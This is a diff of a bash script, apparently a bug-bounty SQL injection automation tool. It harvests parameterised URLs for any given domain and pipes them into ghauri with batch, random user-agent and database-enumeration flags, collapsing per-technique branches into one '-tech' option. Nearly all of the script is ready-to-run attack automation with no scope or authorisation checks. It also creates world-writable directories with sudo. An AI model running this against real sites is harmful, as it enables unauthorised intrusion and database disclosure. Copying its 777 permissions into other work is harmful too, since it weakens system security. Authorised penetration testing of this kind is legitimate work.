@@ -7,15 +7,12 @@ BOLD_YELLOW="\033[1;33m"
 # Function to display usage message
 display_usage() {
     echo "Usage:"
-    echo "     $0 -l http://example.com -all"
-    echo "     $0 -l http://example.com -t"
+    echo "     $0 -l http://example.com -tech 'T'"
+    echo "     $0 -d http://example.com -tech 'B'"
     echo ""
-    echo "Techniques: -all, -b, -t, -e, -bb"
+    echo "Techniques: -tech, -b, -t, -e, -bb"
     echo "          -all    All type of SQLi"
     echo "          -b      Blind sqli"
-    echo "          -t      Time based sqli"
-    echo "          -e      Error based sqli"
-    echo "          -bb     Boolean based sqli"
     echo ""
     echo "Options:"
     echo "  -h               Display this help message"
@@ -34,7 +31,7 @@ fi
 
 # Function to check installed tools
 check_tools() {
-    tools=("unfurl" "subfinder" "anew" "httpx" "urlfinder" "gau" "waybackurls" "ghauri" "iconv")
+    tools=("unfurl" "anew" "urlfinder" "ghauri" "iconv")
 
     echo "Checking required tools:"
     for tool in "${tools[@]}"; do
@@ -66,29 +63,6 @@ if [[ "$1" == "-c" ]]; then
     sudo rm -rf ./*
     urlfinder -h
 
-    echo "gau=================================="
-    wget "https://github.com/lc/gau/releases/download/v2.2.4/gau_2.2.4_linux_amd64.tar.gz"
-    sudo tar -xvzf gau_2.2.4_linux_amd64.tar.gz
-    sudo mv gau /usr/local/bin/
-    sudo chmod +x /usr/local/bin/gau
-    sudo rm -rf ./*
-    gau -h
-
-    echo "subfinder=================================="
-    wget "https://github.com/projectdiscovery/subfinder/releases/download/v2.7.1/subfinder_2.7.1_linux_amd64.zip"
-    sudo unzip subfinder_2.7.1_linux_amd64.zip
-    sudo mv subfinder /usr/local/bin/
-    sudo chmod +x /usr/local/bin/subfinder
-    sudo rm -rf ./*
-    subfinder -h
-
-    echo "httpx=================================="
-    wget "https://github.com/projectdiscovery/httpx/releases/download/v1.6.10/httpx_1.6.10_linux_amd64.zip"
-    sudo unzip httpx_1.6.10_linux_amd64.zip
-    sudo mv httpx /usr/local/bin/
-    sudo chmod +x /usr/local/bin/httpx
-    sudo rm -rf ./*
-    httpx -h
 
     echo "anew=================================="
     wget "https://github.com/tomnomnom/anew/releases/download/v0.1.1/anew-linux-amd64-0.1.1.tgz"
@@ -108,14 +82,6 @@ if [[ "$1" == "-c" ]]; then
     ghauri -h
     cd sqlier
 
-    echo "waybackurls=================================="
-    wget "https://github.com/tomnomnom/waybackurls/releases/download/v0.1.0/waybackurls-linux-amd64-0.1.0.tgz"
-    sudo tar -xzvf waybackurls-linux-amd64-0.1.0.tgz
-    sudo mv waybackurls /usr/local/bin/
-    sudo chmod +x /usr/local/bin/waybackurls
-    sudo rm -rf ./*
-    waybackurls -h
-
     echo "unfurl=================================="
     wget "https://github.com/tomnomnom/unfurl/releases/download/v0.4.3/unfurl-linux-amd64-0.4.3.tgz"
     sudo tar -xzvf unfurl-linux-amd64-0.4.3.tgz
@@ -130,254 +96,32 @@ if [[ "$1" == "-c" ]]; then
 fi
 
 
-# Time based
-if [[ "$1" == "-d" && "$3" == "-all" ]]; then
+# Single Domain Scan SQLi
+if [[ "$1" == "-d" && "$3" == "-tech" ]]; then
     domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
     # making directory
     main_dir="bug_bounty/$domain_Without_Protocol"
     base_dir="$main_dir/single_domain/sql_injection"
 
-    mkdir -p $main_dir
+    sudo mkdir -p --mode=777 $main_dir
 
-    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt
+    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn | iconv -f ISO-8859-1 -t UTF-8 | grep -aE '\?.*=.*(&.*)?' | grep -aEi '\.(php|asp|aspx|jsp|cfm)' | anew $base_dir/all_params_urls.txt
 
-    gau "$domain_Without_Protocol" --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls -no-subs "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=BEST --random-agent --confirm --force-ssl --dbs --batch
+    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=$4 --random-agent --confirm --force-ssl --dbs --batch
     exit 0
 fi
 
-# Time based
-if [[ "$1" == "-d" && "$3" == "-e" ]]; then
+# Full server Scan SQLi
+if [[ "$1" == "-l" && "$3" == "-tech" ]]; then
     domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
     # making directory
     main_dir="bug_bounty/$domain_Without_Protocol"
     base_dir="$main_dir/single_domain/sql_injection"
 
-    mkdir -p $main_dir
+    sudo mkdir -p --mode=777 $main_dir
 
-    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt
+    urlfinder -all -d "$domain_Without_Protocol" | iconv -f ISO-8859-1 -t UTF-8 | grep -aE '\?.*=.*(&.*)?' | grep -aEi '\.(php|asp|aspx|jsp|cfm)' | anew $base_dir/all_params_urls.txt
 
-    gau "$domain_Without_Protocol" --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls -no-subs "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=E --random-agent --confirm --force-ssl --dbs --batch
-    exit 0
-fi
-
-# Time based
-if [[ "$1" == "-d" && "$3" == "-b" ]]; then
-    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
-    # making directory
-    main_dir="bug_bounty/$domain_Without_Protocol"
-    base_dir="$main_dir/single_domain/sql_injection"
-
-    mkdir -p $main_dir
-
-    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt
-
-    gau "$domain_Without_Protocol" --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls -no-subs "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=B --random-agent --confirm --force-ssl --dbs --batch
-    exit 0
-fi
-
-# Time based
-if [[ "$1" == "-d" && "$3" == "-bb" ]]; then
-    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
-    # making directory
-    main_dir="bug_bounty/$domain_Without_Protocol"
-    base_dir="$main_dir/single_domain/sql_injection"
-
-    mkdir -p $main_dir
-
-    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt
-
-    gau "$domain_Without_Protocol" --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls -no-subs "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=BB --random-agent --confirm --force-ssl --dbs --batch
-    exit 0
-fi
-
-
-# Time based
-if [[ "$1" == "-d" && "$3" == "-t" ]]; then
-    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
-    # making directory
-    main_dir="bug_bounty/$domain_Without_Protocol"
-    base_dir="$main_dir/single_domain/sql_injection"
-
-    mkdir -p $main_dir
-
-    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn -o $base_dir/urlfinder.txt
-
-    gau "$domain_Without_Protocol" --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls -no-subs "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --batch
-    exit 0
-fi
-
-# All sqlis
-if [[ "$1" == "-l" && "$3" == "-all" ]]; then
-    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
-    # making directory
-    main_dir="bug_bounty/$domain_Without_Protocol"
-    base_dir="$main_dir/multi_domain/sql_injection"
-
-    mkdir -p $main_dir
-
-    urlfinder -all -d "$domain_Without_Protocol" -o $base_dir/urlfinder.txt
-
-    gau "$domain_Without_Protocol" --subs --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=BEST --random-agent --confirm --force-ssl --dbs --batch
-    exit 0
-fi
-
-# Time based
-if [[ "$1" == "-l" && "$3" == "-t" ]]; then
-    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
-    # making directory
-    main_dir="bug_bounty/$domain_Without_Protocol"
-    base_dir="$main_dir/multi_domain/sql_injection"
-
-    mkdir -p $main_dir
-
-    urlfinder -all -d "$domain_Without_Protocol" -o $base_dir/urlfinder.txt
-
-    gau "$domain_Without_Protocol" --subs --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=T --random-agent --confirm --force-ssl --dbs --batch
-    exit 0
-fi
-
-
-# Blind based
-if [[ "$1" == "-l" && "$3" == "-b" ]]; then
-    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
-    # making directory
-    main_dir="bug_bounty/$domain_Without_Protocol"
-    base_dir="$main_dir/multi_domain/sql_injection"
-
-    mkdir -p $main_dir
-
-    urlfinder -all -d "$domain_Without_Protocol" -o $base_dir/urlfinder.txt
-
-    gau "$domain_Without_Protocol" --subs --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=B --random-agent --confirm --force-ssl --dbs --batch
-    exit 0
-fi
-
-# Error based
-if [[ "$1" == "-l" && "$3" == "-e" ]]; then
-    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
-    # making directory
-    main_dir="bug_bounty/$domain_Without_Protocol"
-    base_dir="$main_dir/multi_domain/sql_injection"
-
-    mkdir -p $main_dir
-
-    urlfinder -all -d "$domain_Without_Protocol" -o $base_dir/urlfinder.txt
-
-    gau "$domain_Without_Protocol" --subs --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=E --random-agent --confirm --force-ssl --dbs --batch
-    exit 0
-fi
-
-# Error based
-if [[ "$1" == "-l" && "$3" == "-bb" ]]; then
-    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
-    # making directory
-    main_dir="bug_bounty/$domain_Without_Protocol"
-    base_dir="$main_dir/multi_domain/sql_injection"
-
-    mkdir -p $main_dir
-
-    urlfinder -all -d "$domain_Without_Protocol" -o $base_dir/urlfinder.txt
-
-    gau "$domain_Without_Protocol" --subs --providers wayback,commoncrawl,otx,urlscan --verbose --o $base_dir/gau.txt
-
-    waybackurls "$domain_Without_Protocol" | tee $base_dir/waybackurls.txt
-
-    cat $base_dir/urlfinder.txt $base_dir/gau.txt $base_dir/waybackurls.txt | sed 's/:[0-9]\+//' | anew | tee $base_dir/all_urls.txt
-
-    cat $base_dir/all_urls.txt | grep -a "[=&]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew | tee $base_dir/all_params_urls_iso.txt
-
-    iconv -f ISO-8859-1 -t UTF-8 $base_dir/all_params_urls_iso.txt -o $base_dir/all_params_urls.txt
-
-    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=BB --random-agent --confirm --force-ssl --dbs --batch
+    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=$4 --random-agent --confirm --force-ssl --dbs --batch
     exit 0
 fi
